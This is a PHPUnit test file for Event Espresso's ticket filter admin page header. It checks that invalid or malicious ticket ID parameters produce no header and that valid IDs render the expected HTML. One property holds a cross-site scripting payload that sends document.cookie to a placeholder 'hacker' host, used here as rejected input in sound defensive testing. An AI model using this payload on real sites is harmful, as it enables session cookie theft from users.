<?php

namespace EventEspresso\tests\testcases\core\domain\services\admin\registrations\list_table\page_header;

use EE_Error;
use EE_Price;
use EE_Ticket;
use EEM_Ticket;
use EventEspresso\core\domain\services\admin\registrations\list_table\page_header\TicketFilterHeader;
use EventEspresso\core\exceptions\InvalidDataTypeException;
use EventEspresso\core\exceptions\InvalidInterfaceException;
use EventEspresso\tests\mocks\core\services\request\RequestMock;
use Generator;
use InvalidArgumentException;
use PHPUnit\Framework\AssertionFailedError;
use PHPUnit\Framework\TestCase;
use ReflectionException;

/**
 * @group AdminPageHeaderDecoratorTests
 */
class TicketFilterHeaderTest extends TestCase
{

    /**
     * @var EE_Ticket $ticket
     */
    protected $ticket;

    /**
     * @var EE_Ticket $free_ticket
     */
    protected $free_ticket;

    /**
     * @var string $xss
     */
    private $xss = '"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>';


    /**
     * @throws AssertionFailedError
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws ReflectionException
     * @since $VID:$
     */
    public function setUp()
    {
        $this->setUpTickets();
    }

    /**
     * @throws EE_Error
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws ReflectionException
     * @throws InvalidArgumentException
     * @throws AssertionFailedError
     * @since $VID:$
     */
    public function setUpTickets()
    {
        $price = EE_Price::new_instance(
            [
                'PRT_ID'     => 1,
                'PRC_name'   => 'Tree Fiddy',
                'PRC_amount' => 3.5,
            ]
        );
        $this->assertTrue($price->save() > 0);
        $this->ticket = EE_Ticket::new_instance(
            [
                'TKT_name' => 'NO FREEBIE FOR YOU!!!',
                'TKT_price'   => $price->amount(),
                'TKT_taxable' => false
            ]
        );
        $this->assertTrue($this->ticket->save() > 0);
        $this->ticket->_add_relation_to($price, 'Price');
        $this->free_ticket = EE_Ticket::new_instance(
            [
                'TKT_name' => 'I am not Groot... I am Free!',
                'TKT_price'   => 0,
                'TKT_taxable' => false
            ]
        );
        $this->assertTrue($this->free_ticket->save() > 0);
    }


    /**
     * @param array $get_params
     * @return TicketFilterHeader
     * @throws EE_Error
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws InvalidArgumentException
     * @since $VID:$
     */
    private function getTicketFilterHeader(array $get_params)
    {
        return new TicketFilterHeader(
            new RequestMock($get_params, [], [], [], []),
            EEM_Ticket::instance()
        );
    }


    /**
     * generator function to replace phpunit's dataProvider
     * because those run during initial phpunit setup
     * and NOT when this actual test class is run,
     * therefore making it impossible to create
     * and save entities to the database in order to use
     * their autoincrement IDs in this function
     * and have those entities still exist when these
     * testcases actually run.
     *
     * @return Generator
     * @throws EE_Error
     * @since  $VID:$
     */
    public function testDataGenerator()
    {
        $test_data = [
            // empty array
            [[], ''],
            // invalid keys
            [['TKT-ID' => $this->ticket->ID()], ''],
            [['ticket-id' => $this->ticket->ID()], ''],
            // invalid values
            [['TKT_ID' => '<h1>I am from the Future!!!</h1>'], ''],
            [['TKT_ID' => $this->xss], ''],
            [['ticket_id' => '<h1>I am from the Future!!!</h1>'], ''],
            [['ticket_id' => $this->xss], ''],
            // all good
            // [['TKT_ID' => $this->ticket->ID()], ''],
            [
                ['TKT_ID' => $this->ticket->ID()],
                '<h3 style="line-height:1.5em;">Viewing registrations for ticket:&nbsp; &nbsp; <span class="drk-grey-text" style="font-size:.9em;"><span class="dashicons dashicons-tickets-alt"></span><span class="ee-ticket-name">NO FREEBIE FOR YOU!!!</span> <span class="ee-ticket-price">$3.50 <span class="currency-code">(USD)</span></span></span></h3>'
            ],
            [
                ['TKT_ID' => $this->free_ticket->ID()],
                '<h3 style="line-height:1.5em;">Viewing registrations for ticket:&nbsp; &nbsp; <span class="drk-grey-text" style="font-size:.9em;"><span class="dashicons dashicons-tickets-alt"></span><span class="ee-ticket-name">I am not Groot... I am Free!</span> <span class="reg-overview-free-event-spn">free</span></span></h3>'
            ],
            [
                ['ticket_id' => $this->ticket->ID()],
                '<h3 style="line-height:1.5em;">Viewing registrations for ticket:&nbsp; &nbsp; <span class="drk-grey-text" style="font-size:.9em;"><span class="dashicons dashicons-tickets-alt"></span><span class="ee-ticket-name">NO FREEBIE FOR YOU!!!</span> <span class="ee-ticket-price">$3.50 <span class="currency-code">(USD)</span></span></span></h3>'
            ],
            [
                ['ticket_id' => $this->free_ticket->ID()],
                '<h3 style="line-height:1.5em;">Viewing registrations for ticket:&nbsp; &nbsp; <span class="drk-grey-text" style="font-size:.9em;"><span class="dashicons dashicons-tickets-alt"></span><span class="ee-ticket-name">I am not Groot... I am Free!</span> <span class="reg-overview-free-event-spn">free</span></span></h3>'
            ],
        ];
        foreach ($test_data as $data) {
            yield $data;
        }
    }


    /**
     * @throws EE_Error
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws ReflectionException
     * @throws InvalidArgumentException
     * @since  $VID:$
     */
    public function testGetHeaderText()
    {
        foreach ($this->testDataGenerator() as list($get_params, $expected)) {
            $ticket_filter_header = $this->getTicketFilterHeader($get_params);
            $header_text = $ticket_filter_header->getHeaderText();
            // strip out nonce since it constantly changes
            $header_text = preg_replace('/&edit_nonce=\S+"/', '&edit_nonce="', $header_text);
            $this->assertEquals($expected, $header_text);
        }
    }
}
